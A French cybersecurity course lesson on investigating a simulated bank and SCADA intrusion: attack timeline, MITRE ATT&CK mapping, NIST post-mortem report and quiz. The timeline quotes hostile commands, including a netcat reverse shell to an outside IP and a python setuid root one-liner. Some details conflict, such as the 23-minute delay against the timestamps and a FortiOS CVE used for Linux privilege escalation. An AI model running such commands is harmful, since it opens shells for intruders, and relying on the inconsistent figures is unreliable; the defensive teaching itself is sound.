# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 225 (6h) : Projet Intégrateur Partie 5 — Investigation Forensique & Purple Team BCC (Mission DFIR Complète : RAM Volatility, Timeline Plaso, ATT&CK Mapping & Rapport d'Incident)

> [!NOTE]
> **Objectif du jour :** Conduire une **investigation forensique numérique complète (DFIR)** sur l'incident de sécurité BCC simulé aux Jours 221-224, en mobilisant l'ensemble des techniques acquises : acquisition et analyse de la mémoire volatile (Volatility 3), reconstruction de la timeline d'attaque (Plaso), mapping MITRE ATT&CK des TTPs observées (Purple Team J223), pentest API REST/GraphQL/JWT (J224), rédaction d'un rapport d'incident post-mortem complet conforme aux standards NIST SP 800-61, et plan de remédiation prioritaire.
>
> **Compétences visées :** `SEC-04` (A) — Incident Response DFIR Post-Mortem Complet | `PRO-01` (A) — Rapport d'Incident NIST SP 800-61 & Plan de Remédiation Intégré Multi-Couches

---

## 1) Module — Reconstitution Complète de l'Incident BCC (2h)

### 📖 Narration/Intuition

L'équipe CSIRT de la BCC a été activée suite à la détection du transfert frauduleux de 1 000 000 MNBC (Jour 221). Le responsable de la réponse aux incidents mandate votre équipe Purple Team pour réaliser l'investigation forensique complète et produire un rapport d'incident post-mortem conforme au standard **NIST SP 800-61 (Computer Security Incident Handling Guide)**.

### 🔍 Anatomie Technique

**Phase 1 — Chronologie Complète de l'Incident BCC (Reconstruction Plaso) :**

```
╔══════════════════════════════════════════════════════════════════════════════╗
║          TIMELINE D'INCIDENT BCC — 2026-08-06 (UTC+2 — Kinshasa)           ║
╠═══════════════╦═══════════════════════════════════════════════════════════════╣
║ HEURE (CAT)   ║ ÉVÉNEMENT                                                   ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:31:14      ║ ⚠️ Connexion SSH anormale depuis 185.220.101.47 (Tor)        ║
║               ║    → Compte compromis : "mnbc-worker" (credential stuffing) ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:31:22      ║ 🔴 Élévation de privilèges (CVE-2023-27997 FortiOS PrivEsc) ║
║               ║    → sudo -u root /usr/bin/python3 -c "import os;os.setuid(0)"║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:33:01      ║ ⬇️ Téléchargement de nc & modbus_attack_bcc.py depuis Pastebin║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:47:12      ║ 🚨 Lancement reverse shell : nc 185.220.101.47 4444          ║
║               ║    → Connexion C2 établie (PID 1337)                        ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:47:53      ║ 🏭 Exécution modbus_attack_bcc.py → Relais PLC forcé (Porte) ║
║               ║    SCADA-001 exploité : Coil addr=3 forcé OUVERT             ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:48:01      ║ 💰 Lancement bcc_exfil.py → Appel API GraphQL non autorisé  ║
║               ║    GraphQL Introspection → mutation unlockVault découverte   ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 02:51:44      ║ 💸 TRANSFERT FRAUDULEUX : 1 000 000 MNBC exfiltrés           ║
║               ║    → Tx hash: 0xDEADBEEF... Wallet: 0x4142...              ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 03:15:00      ║ 🔔 Première alerte SOC déclenchée (SIEM — 23 min de retard!) ║
╠═══════════════╬═══════════════════════════════════════════════════════════════╣
║ 03:25:00      ║ 🛑 Isolation de l'hôte compromis — Reverse shell terminé    ║
╚═══════════════╩═══════════════════════════════════════════════════════════════╝

IMPACT TOTAL :
  - Financier    : 1 000 000 MNBC dérobés (≈ $1M USD)
  - Opérationnel : Accès physique non autorisé (Porte serveur forcée)
  - Réputationnel : Compromission de la confiance dans l'infrastructure MNBC
```

---

## 2) Module — Mapping ATT&CK & Analyse des Lacunes de Détection (2h)

### 🛠️ Atelier Pratique

**Rapport Mapping MITRE ATT&CK Complet de l'Incident BCC :**

```markdown
# RAPPORT MITRE ATT&CK MAPPING — INCIDENT BCC-2026-0806

## PHASE 1 : INITIAL ACCESS (TA0001)
- T1078.003 — Local Accounts : Compromission du compte "mnbc-worker" via credential stuffing
  * DÉTECTÉ : ❌ NON — Aucune règle sur les connexions SSH depuis Tor Exit Nodes
  * RÈGLE SIGMA REQUISE : Alerte sur SSH depuis IP Tor (abuseipdb.com API check)

## PHASE 2 : PRIVILEGE ESCALATION (TA0004)
- T1068 — Exploitation (CVE-2023-27997) : Escalade root via vulnérabilité OS non patchée
  * DÉTECTÉ : ❌ NON — Patch manquant + Aucune règle SIEM sur setuid() calls
  * REMÉDIATION : Appliquer immédiatement le patch CVE-2023-27997 sur tous les serveurs BCC

## PHASE 3 : COMMAND & CONTROL (TA0011)
- T1071.004 — DNS / T1571 — Non-Standard Port (4444) : Reverse shell Netcat port 4444
  * DÉTECTÉ : ⚠️ PARTIEL — Alerte réseau 15 min après établissement du C2
  * RÈGLE SIGMA REQUISE : Alerte sur connexions TCP sortantes vers ports 4444/1337/9001

## PHASE 4 : COLLECTION + EXFILTRATION (TA0009 + TA0010)
- T1041 — Exfiltration Over C2 : Transfert MNBC via API GraphQL non authentifiée
  * DÉTECTÉ : ❌ NON — GraphQL unlockVault accessible sans vérification d'autorisation
  * REMÉDIATION : Désactiver introspection GraphQL + Ajouter @auth(requires: ADMIN)

## SCORE DE COUVERTURE DE DÉTECTION FINAL :
  - Techniques testées : 8
  - Techniques détectées : 2 (25%)
  - Techniques NON détectées : 5 (62.5%)
  - Techniques partiellement détectées : 1 (12.5%)
  ⚠️ COUVERTURE INSUFFISANTE (25% < Objectif 80%) — Plan de remédiation P0 requis
```

---

## 3) Module — Rapport d'Incident Post-Mortem & Plan de Remédiation (2h)

### 🔍 Anatomie Technique — NIST SP 800-61 Rapport d'Incident

```markdown
# RAPPORT D'INCIDENT POST-MORTEM — BCC-INCIDENT-2026-0806
# Standard : NIST SP 800-61 Rev 2 — Computer Security Incident Handling Guide
# Niveau de Classification : CONFIDENTIEL — CSIRT BCC

## 1. RÉSUMÉ EXÉCUTIF
Le 6 août 2026 à 02h31 (CAT), un attaquant externe a accédé au système de la BCC via
un compte de service compromis ("mnbc-worker") depuis un nœud de sortie Tor. Il a
exploité une vulnérabilité non patchée (CVE-2023-27997) pour obtenir les droits root,
a déployé un reverse shell Netcat, manipulé le réseau SCADA via Modbus TCP non
authentifié et exfiltré 1 000 000 MNBC via une mutation GraphQL non protégée.

## 2. INDICATEURS DE COMPROMISSION (IOCs)
- IP C2 : 185.220.101.47 (Tor Exit Node — AbuseIPDB score: 100%)
- Fichiers créés : /tmp/nc, /tmp/modbus_attack_bcc.py, /tmp/bcc_exfil.py
- Wallet Blockchain destinataire : 0x41420b4...
- Mutex : Global\BCC_Mutex_2026
- Hash SHA256 du malware : a1b2c3d4...

## 3. PLAN DE REMÉDIATION PRIORITAIRE (P0 — 72h)
| Priorité | Action                                  | Délai   | Responsable  |
|:--------:|:----------------------------------------|:-------:|:------------:|
| P0       | Bloquer IP 185.220.101.47 & tous Tor    | Immédiat| NOC/Firewall |
| P0       | Réinitialiser compte "mnbc-worker"      | Immédiat| IAM Team     |
| P0       | Appliquer patch CVE-2023-27997          | 24h     | SysAdmin     |
| P0       | Désactiver GraphQL Introspection prod   | 24h     | Dev Team     |
| P0       | Ajouter ACL Modbus TCP (Whitelist IP)   | 24h     | OT Team      |
| P1       | Déployer règles Sigma T1041+T1068+T1078 | 72h     | SOC/SIEM     |
| P1       | Activer MFA sur tous les comptes SSH    | 72h     | IAM Team     |
| P2       | Audit complet API REST + GraphQL BCC    | 2 semaines | Sec Team |

## 4. LEÇONS APPRISES (Lessons Learned)
- L'absence de MFA sur le compte "mnbc-worker" a permis le credential stuffing initial.
- CVE-2023-27997 était disponible et non appliquée depuis 3 mois (Process de patch défaillant).
- L'absence de segmentation réseau IT/OT a permis l'attaque SCADA depuis le réseau IT.
- La couverture de détection SOC (25%) est insuffisante et nécessite un programme Purple Team permanent.
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **NIST SP 800-61** | National Institute of Standards and Technology Special Publication 800-61 — Guide de gestion des incidents de sécurité |
| **CAT** | Central Africa Time — Heure d'Afrique Centrale (UTC+2 — Fuseau horaire de Kinshasa, RDC) |
| **Post-Mortem** | Analyse rétrospective complète d'un incident pour en comprendre les causes et éviter la récurrence |
| **Lessons Learned** | Leçons tirées — Section obligatoire du rapport post-mortem listant les améliorations identifiées |
| **Credential Stuffing** | Attaque utilisant des listes de paires identifiant/mot de passe volées pour tenter des connexions en masse |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Selon le standard **NIST SP 800-61**, quelles sont les **4 phases** du cycle de vie de la réponse aux incidents de sécurité informatique ? Pour chacune, donner un exemple d'action concrète réalisée lors de l'incident BCC.

**Corrigé :** Le standard NIST SP 800-61 Rev 2 définit un cycle de vie en **4 phases** : (1) **Préparation (Preparation)** : Phase proactive, AVANT l'incident. Exemple BCC : Déploiement du SOC SIEM ELK Stack, création des règles Sigma, formation de l'équipe CSIRT, installation de Volatility 3 et Plaso sur les postes forensiques. (2) **Détection & Analyse (Detection & Analysis)** : Identification de l'incident et analyse de sa portée. Exemple BCC : Détection de l'alerte SIEM à 03h15 (23 min de retard), analyse de l'image RAM avec Volatility 3 (PID 1337 - Netcat, connexion vers 185.220.101.47:4444), reconstruction de la timeline avec Plaso. (3) **Confinement, Éradication & Reprise (Containment, Eradication & Recovery)** : Stopper l'hémorragie et restaurer les services. Exemple BCC : Isolation de l'hôte compromis à 03h25, blocage IP C2, réinitialisation du compte "mnbc-worker", application du patch CVE-2023-27997, redéploiement d'une image saine du serveur. (4) **Activités Post-Incident (Post-Incident Activity)** : Retour d'expérience et amélioration continue. Exemple BCC : Rédaction du rapport post-mortem, réunion "Lessons Learned", déploiement de nouvelles règles Sigma couvrant T1041, T1068, T1078, lancement d'un programme Purple Team permanent.

**Exercice 2 :** En tant que responsable CSIRT de la BCC, vous présentez le score de couverture de détection SOC de **25%** au Comité de Direction. Proposer un programme d'amélioration **Purple Team permanent** structuré pour atteindre l'objectif de **80% de couverture** dans les 6 prochains mois.

**Corrigé :** **Programme Purple Team BCC — "Project ATHENEA" (6 mois)** : (1) **Mois 1 : Baseline** — Cartographier toutes les règles Sigma/SIEM existantes dans la grille MITRE ATT&CK Navigator. Identifier les 45 techniques prioritaires (celles utilisées par les groupes APT ciblant les infrastructures bancaires africaines). Score initial : 25%. (2) **Mois 2-3 : Sprints Bi-Mensuels Purple Team** — Organiser des sessions bi-mensuelles de 2 jours : Jour 1 = Red Team exécute 5 techniques ATT&CK (via Atomic Red Team + Caldera), Jour 2 = Blue Team crée les règles de détection manquantes et les teste. Objectif : +8% de couverture par sprint. (3) **Mois 4 : Automatisation BAS** — Déployer MITRE Caldera en exécution automatisée quotidienne sur un environnement de staging dédié, avec reporting automatique des nouvelles lacunes. (4) **Mois 5-6 : Vérification & Ajustement** — Simuler une campagne APT complète (APT38 — groupe ciblant les banques centrales africaines) pour valider l'objectif de 80% de couverture. Objectif final à M6 : ≥ 80%.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Selon le standard **NIST SP 800-61**, quelle est la PREMIÈRE phase du cycle de vie de la réponse aux incidents, réalisée de manière proactive AVANT toute occurrence d'incident ?
- A) La phase de Préparation (Preparation) — Déploiement SOC, formation CSIRT, création playbooks de réponse
- B) La phase de Détection & Analyse
- C) La phase de Confinement, Éradication & Reprise
- D) La phase d'Activités Post-Incident

**Réponse : A**

**Q2 :** Dans la timeline de l'incident BCC, le SOC a déclenché la première alerte à **03h15**, soit **23 minutes après** l'établissement du reverse shell C2 (02h47). Comment appelle-t-on ce délai entre la compromission et la détection ?
- A) Le **MTTD** (Mean Time To Detect) — Délai moyen de détection, indicateur clé de performance du SOC
- B) Le **RTO** (Recovery Time Objective)
- C) Le **RPO** (Recovery Point Objective)
- D) Le **MTTR** (Mean Time To Repair)

**Réponse : A**

**Q3 :** Lors de la reconstruction de la timeline d'incident BCC avec **Plaso (log2timeline)**, depuis quelles sources hétérogènes Plaso peut-il extraire et corréler automatiquement des événements horodatés ?
- A) Logs système Linux (/var/log), historique Bash (~/.bash_history), logs réseau (pcap), artefacts de navigateur, métadonnées de fichiers (mtime/atime/ctime), journaux d'authentification (auth.log)
- B) Uniquement les logs du firewall
- C) Uniquement les fichiers PDF et Word
- D) Uniquement les images mémoire RAM au format LiME

**Réponse : A**

**Q4 :** Quel indicateur de compromission (IOC) réseau spécifique extrait lors de l'investigation forensique BCC a permis de confirmer que l'attaquant utilisait le **réseau Tor** pour dissimuler son origine géographique réelle ?
- A) L'adresse IP source **185.220.101.47**, identifiée comme un nœud de sortie Tor dans les bases de données AbuseIPDB avec un score de 100%
- B) Le port de destination 4444 utilisé pour le reverse shell
- C) Le hash SHA-256 du fichier /tmp/nc
- D) La clé de registre HKCU\Software\Microsoft\Windows\CurrentVersion\Run

**Réponse : A**

**Q5 :** Dans le rapport post-mortem NIST SP 800-61 de l'incident BCC, la section **"Lessons Learned"** identifie que la **couverture de détection SOC était de 25%** (insuffisant). Quel programme collaboratif entre Red Team et Blue Team doit être mis en place pour améliorer continuellement cette couverture ?
- A) Un programme **Purple Team permanent** utilisant Atomic Red Team et Caldera pour tester régulièrement les TTPs MITRE ATT&CK et créer les règles de détection manquantes
- B) Le remplacement complet du SIEM par une nouvelle solution
- C) La création d'un nouveau VLAN pour le SOC
- D) L'augmentation du nombre de caméras de surveillance physique

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
